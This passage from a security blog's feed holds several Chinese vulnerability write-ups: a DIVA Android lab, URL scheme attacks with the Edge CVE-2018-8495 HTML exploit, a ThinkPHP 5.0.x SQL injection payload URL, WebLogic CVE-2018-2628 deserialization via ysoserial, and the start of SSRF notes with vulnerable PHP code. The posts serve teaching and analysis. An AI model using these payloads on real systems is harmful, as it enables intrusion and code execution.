src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/EF0E3906-D9B2-4BD6-BC0F-414D71DA3D10.png" alt="EF0E3906-D9B2-4BD6-BC0F-414D71DA3D10"></p><p>使用drozer<br><code>run scanner.provider.finduris -a jakhar.aseem.divarun app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/</code><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/36C8BF5A-6474-44C8-B9AA-AE9A482DC123.png" alt="36C8BF5A-6474-44C8-B9AA-AE9A482D"></p><h2 id="硬编码-1"><a href="#硬编码-1" class="headerlink" title="硬编码"></a>硬编码</h2><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/144FE9A1-AACE-4A59-9C1A-0F4DB246E6BB.png" alt="144FE9A1-AACE-4A59-9C1A-0F4DB246E6BB"></p><p>在Hardcode2Activity. class中<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/BF617522-2C2F-48F9-B65A-2B4675665085.png" alt="BF617522-2C2F-48F9-B65A-2B4675665085"></p><p>activity在加载时创建了DivaJni class的一个对象。查看其它文件发现有一个叫做DivaJni.class的文件</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/44DDB38B-926E-4337-834B-EC1F12EC7641.png" alt="44DDB38B-926E-4337-834B-EC1F12E"></p><p>程序加载了一个名为divajni的库，解压apk进入lib目录。对于每种架构，都有一个libdivajni.so的实例。随便找一个运行strings命令<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/21E2A8E6-1750-48BA-9864-B5DD6323669D.png" alt="21E2A8E6-1750-48BA-9864-B5DD6323669D"></p><p>olsdfgad;lh找到了这个key。这个写法是 java调用c/cpp程序常用的jni接口。可以ida反编译so文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/A60735F3-14DE-40EF-90C9-404C1F2815F6.png" alt="A60735F3-14DE-40EF-90C9-404C1F2815F6"></p><p>发现是在比较olsdfgad;lh这个字符串<br>或者有源代码，查看源码发现确实存在jni文件夹以及 divajni.c程序<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/034C7DF3-A8B0-42EA-9731-615F81CFA023.png" alt="034C7DF3-A8B0-42EA-9731-615F81CFA023"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/2E668F5C-8C6E-4848-816D-18B16D738EF5.png" alt="2E668F5C-8C6E-4848-816D-18B16D738EF5"></p><p>很显然，将字符串硬编码在so文件中也同样是不安全的<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/39C0EDD2-7CBA-491F-B1B5-AC72F161A8C1.png" alt="39C0EDD2-7CBA-491F-B1B5-AC72F161A8"></p><h2 id="输入验证问题"><a href="#输入验证问题" class="headerlink" title="输入验证问题"></a>输入验证问题</h2><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/CB50C2C4-E553-40FC-987A-7545C15457C6.png" alt="CB50C2C4-E553-40FC-987A-7545C15457"><br>翻译一下是：<br>目标：这是一个导弹发射程序，我们应当传播爱与和平而不是战争0.0。让此程序失效，你的任务不是找到代码发射导弹，而是让应用崩溃（并找到崩溃原因）。<br>提示：不正确或不存在的输入验证会导致应用漏洞。外部的输入必须得进行验证。这是一个经典的缓冲区溢出漏洞。如果你可以实现代码执行，那就太nb了。</p><p>然提示是缓冲区溢出类漏洞，那主要工作就是要确定缓冲区的长度。<br>查看反编译代码 InputValidation3Activity.class 发现验证需要 djni.initiateLaunchSequence() 来确定<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/89038230-757E-4D9B-89F0-C52D82AF97CE.png" alt="89038230-757E-4D9B-89F0-C52D82AF97CE"></p><p>分析代码，仍然需要System.loadLibrary(“divajni”)中jni接口调用的 divajni.c程序，查看 divajni.c 源码，找到 initiateLaunchSequence()的定义</p><p>查看 divajni.c 源码，找到 initiateLaunchSequence()的定义</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/15619874950258.jpg" alt=""></p><p>分析代码，问题出在strcpy(code,pcode),没有对pcode的长度做判断就直接给了code，而code的长度之前定义的为20，所以这里就会出现很明显的缓冲区溢出。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/15619875978311.jpg" alt=""></p><p>也可以通过ida查看so文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/931DE608-B973-4912-960F-D1F577128F9B.png" alt="931DE608-B973-4912-960F-D1F577128F9B"></p><p>测试时发现，当输入字符 大于32 时，才可以引发程序崩溃。可以使用 adb logcat查看崩溃时堆栈数据<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/07/01/CDE5464E-7752-44B4-8B46-72C6BF1D9E79.png" alt="CDE5464E-7752-44B4-8B46-72C6BF1D9E79"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;diva是一个移动安全测试app，专门给开发者和安全人员演示用的app，里面包含很多的安全问题。&lt;br&gt;地址：&lt;a href=&quot;https://github.com/payatu/diva-android&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ht
      
    
    </summary>
    
    
      <category term="writeup" scheme="http://zerokeeper.github.io/categories/writeup/"/>
    
    
      <category term="android" scheme="http://zerokeeper.github.io/tags/android/"/>
    
      <category term="diva" scheme="http://zerokeeper.github.io/tags/diva/"/>
    
      <category term="ctf" scheme="http://zerokeeper.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>URL Scheme Attack</title>
    <link href="http://zerokeeper.github.io/experience/url-scheme-attack.html"/>
    <id>http://zerokeeper.github.io/experience/url-scheme-attack.html</id>
    <published>2018-11-08T01:42:00.000Z</published>
    <updated>2019-10-21T13:12:12.819Z</updated>
    
    <content type="html"><![CDATA[<h3 id="URL-scheme简介"><a href="#URL-scheme简介" class="headerlink" title="URL scheme简介"></a>URL scheme简介</h3><p>URL scheme是什么？简单的说就是部分app应用会注册自定义自己的协议，通过访问这类协议来调用启动app。url scheme的工作流程是：app在系统中注册url scheme项，当浏览器或其他支持url的应用访问 特定的 url scheme 时，在系统中查找相对应的url scheme项，从而启动该应用程序。基本上是各个平台的app都有。</p><h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><p><code>mailto:admin@example.com,thunder://xxxxx,tel:+18888888888,sms:18688886666,alipays://platformapi/startapp</code>等等。当然还包括还有常见的file、dict、ftp，不过这里想说的是各类app应用程序的url scheme。</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><pre><code>[scheme]://[host]/[path]?[query]</code></pre><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul><li>特定后缀名的文件启动程序</li><li>网页或者链接中的描点启动程序</li></ul><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>windows平台下URL scheme会在注册表中注册，具体可<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)" target="_blank" rel="noopener">参考</a><br>在注册表中像这样格式存在的</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541762829.png" alt="snipaste_20181109_192603.png"></p><p>例如</p><pre><code>HKEY_CLASSES_ROOT   test      (Default) = &quot;URL:test Protocol&quot;      URL Protocol = &quot;&quot;      DefaultIcon         (Default) = &quot;test.exe,1&quot;      shell         open            command               (Default) = &quot;C:\Program Files\test\test.exe&quot; &quot;%1&quot;</code></pre><p>假设test.exe是注册的应用程序，%1是占位符启动参数。通过url传递参数给目标程序。双引号是为了避免参数中存在空格。这样的形式就很容易通过拼接参数出现命令注入了。<br>HKEY_CLASSES_ROOT 下不仅保存了伪协议的列表，还有文件扩展名的关联数据。事实上 Win32 程序处理本地文件和 url 的打开是类似的，甚至可以使用同一套 Win32 API —— ShellExecute(Ex) 。算上 ANSI 和 Unicode 的版本，一共 4 个函数。<br>打开文件</p><pre><code>ShellExecuteW(NULL, L&quot;open&quot;, L&quot;c:\\test.txt&quot;, NULL, NULL , SW_SHOW );</code></pre><p>打开链接</p><pre><code>ShellExecuteW(NULL, L&quot;open&quot;, L&quot;https://www.baidu.com&quot;, NULL, NULL , SW_SHOW );</code></pre><p> ShellExecute可以有利用的两个点：<br>传入 url，却被解析成本地路径而变成打开文件甚至运行可执行文件；<br>其次是关联命令行里包裹参数 “%1” 的双引号可以被闭合掉的。</p><pre><code>www.baidu.com..\..\..\..\..\..\..\..\..\..\..\windows\system32\calc.exe</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541761277.png" alt="snipaste_20181109_190055.png"></p><p>windows系统在运行框输入，利用多个跳转符，后面的windows\system32\calc.exe会被当成文件执行，运行即可弹出计算器，当年QQ的远程命令执行漏洞也是这个exp</p><h3 id="Edge-远程代码执行"><a href="#Edge-远程代码执行" class="headerlink" title="Edge 远程代码执行"></a>Edge 远程代码执行</h3><p>edge(CVE-2018-8495)，2018年10月Edge的远程代码执行漏洞，利用了WSHFile协议，通过参数注入，造成远程代码执行。<br>查看\HKEY_CLASSES_ROOT\WSHFile\Shell\Open\Command的值<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/09/1541763690.png" alt="snipaste_20181109_193956.png"></p><p>WSHFile是指向了wscript.exe，wscript.exe是windows的内置的脚本解释器，可以通过WSHFile去运行一个脚本。<br>具体可看其漏洞分析，最后构造的exp如下：</p><pre><code>&lt;a id=&quot;q&quot; href=&apos;wshfile:test/../../WinSxS/AMD921~1.48_/SyncAppvPublishingServer.vbs&quot; test test;calc;&quot;&apos;&gt;test&lt;/a&gt;&lt;script&gt;window.onkeydown=e=&gt;{    window.onkeydown=z={};    q.click()}&lt;/script&gt;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541838893.png" alt="snipaste_20181110_163428.png"></p><p>这是一个例子，还有更多的例子如Electron导致vscode、网易云命令执行的例子，可以看先前<a href="http://www.zerokeeper.com/vul-analysis/electron-remote-command-execution-vulnerability-cve20181000006.html" target="_blank" rel="noopener">分析</a></p><h3 id="Android-URL-scheme"><a href="#Android-URL-scheme" class="headerlink" title="Android URL scheme"></a>Android URL scheme</h3><p>android上的Intent Scheme URLs攻击基于android浏览器桥梁间接实现Intend-Based攻击。可以读取文件或者启动调用的应用程序。</p><p>语法如下：</p><pre><code>&lt;script&gt;location.href = &quot;intent:mydata#Intent;action=myaction;type=text/plain;end&quot;&lt;/script&gt;  </code></pre><p>等价的java语法：</p><pre><code>Intent intent = new Intent(&quot;myaction&quot;);  intent.setData(Uri.parse(&quot;mydata&quot;));  intent.setType(&quot;text/plain&quot;);</code></pre><p>例如：</p><pre><code>&lt;a href=&quot;intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end&quot;&gt;   发送短信&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end&quot;&gt;   打开相机&lt;/a&gt;&lt;br&gt;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541842168.jpg" alt="20181110172511.jpg"></p><p>使用Intent Scheme就可以通过浏览器调用android上的应用。</p><p>还有一类就是第三方的URL Scheme，来启动android上的app。以打开某些网页会启动支付宝到抢红包界面为例</p><pre><code>&lt;html&gt;&lt;script&gt;window.location.href=&apos;alipays://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=https%3A%2F%2Fqr.alipay.com%2Fc1x05309e4ttz2v7xrwrzcd%3F_s%3Dweb-other&apos;&lt;/script&gt;&lt;/html&gt;</code></pre><p>效果如下</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/11/10/1541848929.gif" alt="ec413b7289d2ec6a4cf5492e658b81cb-alipay.gif"></p><p>只是这里的qrcode失效了，所以领取失败，换成自己的就可以了。<br>更进一步的就是之前的支付宝应用克隆，不过它除了伪协议，还利用了webview跨域，和APP的setAllowUniversalAccessFromFile URLs值为true，导致File协议可跨域读取文件。具体分析可<a href="https://open.appscan.io/article-470.html" target="_blank" rel="noopener">参考</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>URL scheme是为了操作系统、浏览器、应用方便交互设计，但操作系统不同、URL scheme功能不同，会导致存在安全问题。尤其是利用浏览器或者应用程序存在的漏洞，来攻击操作系统，扩大攻击面。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://paper.seebug.org/719/#0x02-url-scheme" target="_blank" rel="noopener">从 CVE-2018-8495 看 PC 端 url scheme 的安全问题</a></li><li><a href="https://xz.aliyun.com/t/1994" target="_blank" rel="noopener">Electron 自定义协议命令注入（CVE-2018-1000006）分析和 Url Scheme 安全考古</a></li><li><a href="http://drops.xmd5.com/static/drops/papers-2893.html" target="_blank" rel="noopener">Intent scheme URL attack</a></li><li><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf" target="_blank" rel="noopener">Aack Surface Extended by URL Schemes</a></li><li><a href="https://xz.aliyun.com/t/2881" target="_blank" rel="noopener">cve-2018-8495-Microsoft Edge 远程命令执行-分析</a></li><li><a href="https://www.freebuf.com/articles/terminal/160544.html" target="_blank" rel="noopener">应用克隆，从支付宝自动领红包链接谈起</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;URL-scheme简介&quot;&gt;&lt;a href=&quot;#URL-scheme简介&quot; class=&quot;headerlink&quot; title=&quot;URL scheme简介&quot;&gt;&lt;/a&gt;URL scheme简介&lt;/h3&gt;&lt;p&gt;URL scheme是什么？简单的说就是部分app应用会注册
      
    
    </summary>
    
    
      <category term="experience" scheme="http://zerokeeper.github.io/categories/experience/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP框架5.0.x SQL注入分析</title>
    <link href="http://zerokeeper.github.io/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</id>
    <published>2018-05-02T20:43:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。ThinkPHP从诞生的12年间一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码 的同时，也注重易用性。目前ThinkPHP框架是国内使用量最大的框架之一，国内用户量众多。<br>3月26号ThinkPHP更新到5.0.16。5.0.16之前的版本存在一个sql注入漏洞，在 insert 和 update 方法中，传入的参数可控，且无严格过滤，最终导致本次SQL注入漏洞发生。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2664713311.png" alt="ThinkPHP-5.0.16-1.png"></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>thinkphp官网下载5.0.14版本下载：<a href="http://www.thinkphp.cn/down/1107.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1107.html</a><br>创建数据库：</p><pre><code>create database thinkphp;create table user(id int auto_increment primary key,username varchar(50),password varchar(50));insert into user(id,username,password) values(1,&quot;test&quot;,&quot;thinkphp&quot;);</code></pre><p>配置连接数据库文件：\thinkphp\application\database.php<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/3835111304.png" alt="ThinkPHP-5.0.16-2.png"></p><p>打开thinkphp的调试和trace模式：\thinkphp\application\config.php<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2720014132.png" alt="ThinkPHP-5.0.16-3.png"></p><p>写一个update功能的demo，内容如下：\thinkphp\application\index\controller\Index.php<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2250740095.png" alt="ThinkPHP-5.0.16-4.png"></p><p>变量获取</p><pre><code>$name = input(&quot;get.name/a&quot;);input()为TP框架的助手函数，get.name/a 表示获取get传入的name变量，并将其强制转换为数组类型</code></pre><p>数据库查询</p><pre><code>Db::table(&quot;users&quot;)-&gt;where([&quot;id&quot;=&gt;1])-&gt;insert([&quot;username&quot;=&gt;$name]);TP框架采用的是PDO方式对数据库进行查询</code></pre><p>访问payload触发漏洞：</p><pre><code>http://172.16.110.166/thinkphp_5.0.14_full/public/index.php?password[0]=inc&amp;password[1]=updatexml(2,concat(0x7e,user()),0)&amp;password[2]=1![ThinkPHP-5.0.16-5.png][6]</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在index.php处下断点，进行动态调试跟踪。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/198436911.png" alt="ThinkPHP-5.0.16-6.png"></p><p>F7跟进后来到helper.php,这里是数据库连接操作，这里的调用非常深，不用进入，F8直接跳过<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2044932373.png" alt="ThinkPHP-5.0.16-7.png"></p><p>来到query.php,这里是分析的关键<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/1868409096.png" alt="ThinkPHP-5.0.16-8.png"></p><p>接着往下看，来到Builder.php，这里是生成UPDATE的SQL语句，F7跟进去看<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/3342367495.png" alt="ThinkPHP-5.0.16-9.png"></p><p>这里有两个操作，parseTable和parseData。F7跟进后发现在parseData进行了sql语句拼接。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/3462864402.png" alt="ThinkPHP-5.0.16-10.png"></p><p>跟进后发现，当$val是数组，根据$val[0]值执行switch操作。paylaod传入的$val[0]值为inc<br>跟入此处的parseKey，来到Mysql.php<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/870503333.png" alt="ThinkPHP-5.0.16-12.png"></p><p>发现parseKey并没有对$key做任何过滤处理，返回任然是updatexml(2,concat(0x7e,user()),0)<br>floatval($val[2])返回1，即是传入的password[2]=1<br>最后回到parseData进行下一步操作，返回sql语句<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2979525599.png" alt="ThinkPHP-5.0.16-13.png"></p><p>接着往下走语句被执行，造成SQL注入<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/1631637188.png" alt="ThinkPHP-5.0.16-14.png"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>官方修复<a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b</a></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2194723222.png" alt="ThinkPHP-5.0.16-15.png"></p><p>在dec和inc操作之前对$val[1]的值做了检查</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">ThinkPHP框架 5.0.x sql注入漏洞分析</a><br>2.<a href="https://bbs.ichunqiu.com/thread-38284-1-1.html" target="_blank" rel="noopener">ThinkPHP框架 &lt; 5.0.16 sql注入漏洞分析</a><br>3.<a href="https://mochazz.github.io/2018/04/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP%205.0.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/" target="_blank" rel="noopener">ThinkPHP5.0.x框架SQL注⼊</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。Thin
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="sqli" scheme="http://zerokeeper.github.io/tags/sqli/"/>
    
      <category term="thinkphp" scheme="http://zerokeeper.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic反序列化漏洞分析(CVE-2018-2628)</title>
    <link href="http://zerokeeper.github.io/vul-analysis/weblogic-anti-serialization-vulnerability-analysis-cve20182628.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/weblogic-anti-serialization-vulnerability-analysis-cve20182628.html</id>
    <published>2018-05-01T03:45:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2018年4月18日，Oracle官方发布了4月份的安全补丁更新CPU（Critical Patch Update），更新中修复了一个高危的 WebLogic 反序列化漏洞CVE-2018-2628。攻击者可以在未授权的情况下通过T3协议对存在漏洞的WebLogic组件进行远程攻击，并可获取目标系统所有权限。<br>影响版本：<br>Oracle WebLogic Server10.3.6.0<br>Oracle WebLogic Server12.2.1.2<br>Oracle WebLogic Server12.2.1.3<br>Oracle WebLogic Server12.1.3.0</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote><p>Java 序列化与反序列化：</p><p>Java序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的<br>writeObject() 方法可以实现序列化。</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject()<br>方法用于反序列化。</p><p>HTTP：多平台之间的通信，管理等</p><p>RMI：是 Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100%<br>基于反序列化，Java RMI 的默认端口是 1099 端口。</p><p>JMX：JMX 是一套标准的代理和服务，用户可以在任何 Java 应用程序中使用这些代理和服务实现管理,中间件软件 WebLogic<br>的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个洞产生原因是weblogic对于T3协议发送的数据包没有过滤，注册一个RMI接口，通过T3协议建立连接，加载回来再一步步解包，利用readObject解析，从而造成反序列化远程代码执行。当然weblogic因为CVE-2017-3248对rmi接口做一个限制，在InboundMsgAbbrev类中，多了一个resolveProxyClass，对RMI接口类型进行了判断，对于是java.rmi.registry.Registry接口注册的，会抛出InvalidObjectException错误。(ps:在测试中发现10.3.6.0版本默认没有这个判断，所以在没有打CVE-2017-3248 patch的情况下可以直接打)<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/1057207924.png" alt="WebLogic-CVE-2018-2628-1.png"></p><p>在java.rmi.registry.Registry处下断点调试，经过一系列的readObject后，最终反序列化执行了命令。<br>这里用未修改的ysoserial生成payload打，可以看见抛出了InvalidObjectException错误，不能成功利用。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/1952802580.png" alt="WebLogic-CVE-2018-2628-2.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/469418190.png" alt="WebLogic-CVE-2018-2628-3.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>因为ysoserial生成的payload是用的java.rmi.registry.Registry，而weblogic对他进行了判断会出错。所以要修改ysoserial里JRMPClient的实现代码，换成其他的RMI接口就可以了，只要是继承extends java.rmi.Remote即可，可以是<br>java.rmi.activation、javax.management.remote.rmi.RMIConnection、sun.jvmstat.monitor.remote.RemoteVm等</p><pre><code>Activator proxy = (Activator)Proxy.newProxyInstance(JRMPClient.class.getClassLoader(),new Class[]{Activator.class},obj);</code></pre><p>所以可以仿照JRMPClient写一个JRMPClient2，重新编译，就可以用ysoserial生成payload打了。这里已经有人写好了<a href="https://github.com/brianwrf/ysoserial" target="_blank" rel="noopener">https://github.com/brianwrf/ysoserial</a><br>注册rmi接口，看到JRMPLister有请求过来了<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/2251787996.png" alt="WebLogic-CVE-2018-2628-4.png"></p><p>执行exploit，建立连接，接收数据payload<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/3137674629.png" alt="WebLogic-CVE-2018-2628-5.png"></p><p>成功执行了命令<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/05/3878194183.png" alt="WebLogic-CVE-2018-2628-6.png"></p><p>这里有个坑，12.2.1.2版本的weblogic，改了rmi接口，虽然远程的服务器能收到连接，但是命令没有执行，而10.3.6.0的weblogic则可以。后来发现是commons-collections库的版本问题，因为weblogic中的依赖jar中，使用了CommonsCollections，10.3.6.0的commons-collections是3.2.0。而12.2.1.2的是com.bea.core.apache.commons.collections.jar，对反序列化问题做了一些检查。</p><h3 id="CVE-2018-2628补丁分析"><a href="#CVE-2018-2628补丁分析" class="headerlink" title="CVE-2018-2628补丁分析"></a>CVE-2018-2628补丁分析</h3><p>对补丁(p27395085_1036_Generic)，发现WeblogicFilterConfig.class的黑名单多了一个sun.rmi.server.UnicastRef</p><pre><code>private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]{&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;, &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;, &quot;org.codehaus.groovy.runtime.MethodClosure&quot;, &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, &quot;sun.rmi.server.UnicastRef&quot;};</code></pre><p>是否可以绕过呢!?</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://paper.seebug.org/584/" target="_blank" rel="noopener">Weblogic 反序列化漏洞(CVE-2018-2628)漫谈</a></li><li><a href="http://5alt.me/2018/04/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="noopener">weblogic反序列化漏洞分析与调试</a></li><li><a href="https://github.com/brianwrf/CVE-2018-2628" target="_blank" rel="noopener">CVE-2018-2628</a></li><li><a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">CVE-2018-2628 简单复现与分析</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;2018年4月18日，Oracle官方发布了4月份的安全补丁更新CPU（Critical Patch Update），更新中修复了一个高危的
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="反序列化漏洞" scheme="http://zerokeeper.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="weblogic" scheme="http://zerokeeper.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>SSRF学习笔记</title>
    <link href="http://zerokeeper.github.io/web-security/ssrf-learning-notes.html"/>
    <id>http://zerokeeper.github.io/web-security/ssrf-learning-notes.html</id>
    <published>2018-04-29T02:06:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><p>curl_exec()版</p><pre><code>function curl($url){      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);}$url = $_GET[&apos;url&apos;];curl($url);  </code></pre><p>file_get_contents()版</p><pre><code>$url = $_GET[&apos;url&apos;];;echo file_get_contents($url);</code></pre><p>fsockopen()版</p><pre><code>function GetFile($host,$port,$link) {     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);     if (!$fp)     {         echo &quot;$errstr (error number $errno) \n&quot;;     }     else     {         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&apos;&apos;;         while (!feof($fp))         {             $contents.= fgets($fp, 1024);         }         fclose($fp);         return $contents;     } }</code></pre><h3 id="ssrf利用"><a href="#ssrf利用" class="headerlink" title="ssrf利用"></a>ssrf利用</h3><p>这里以curl为例，查看curl的版本和该版本支持的协议。如http，file, dict, gopher，sftp</p><pre><code>curl 7.55.1 (x86_64-pc-linux-gnu) libcurl/7.55.1 OpenSSL/1.0.2l 